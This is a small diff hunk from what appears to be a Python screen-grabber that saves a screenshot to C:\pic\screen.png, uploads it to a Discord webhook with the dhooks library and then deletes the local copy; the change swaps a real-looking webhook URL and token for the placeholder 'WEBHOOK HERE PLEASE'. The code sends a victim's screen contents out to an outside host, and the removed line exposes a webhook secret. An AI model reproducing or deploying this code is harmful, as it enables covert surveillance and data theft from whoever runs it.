@@ -11,7 +11,7 @@ def screen():
 
 # it send ti to you're webhook
 def hooksend():
-	hook = dhooks.Webhook('https://discord.com/api/webhooks/879734719141523456/u5RT7tg4ivrxEppDeV0JgS1hfmirg005vPhmSj7xut8i75fhd0zDEQNeja9oxWl4dD1n')
+	hook = dhooks.Webhook('WEBHOOK HERE PLEASE')
 	file = dhooks.File('C:\\pic\\screen.png', name='sreen.png')
 	hook.send(file=file)
 # it delet the screenshot - comment if you want the screenshot to stay in the folder
